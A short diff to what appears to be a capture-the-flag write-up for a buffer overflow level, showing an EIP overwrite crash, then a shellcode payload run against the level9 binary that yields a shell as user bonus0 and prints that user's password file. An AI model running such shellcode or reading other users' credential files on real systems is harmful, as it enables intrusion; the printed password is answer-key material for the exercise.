@@ -20,3 +20,13 @@ Modifing EIP - poc
 Program received signal SIGSEGV, Segmentation fault.
 0x43434343 in ?? ()
 ```
+
+`shellcode.py` generates a payload that will give us a shell as the user bunus0
+
+```
+$ ./level9 $(python /tmp/shellcode9.py)
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
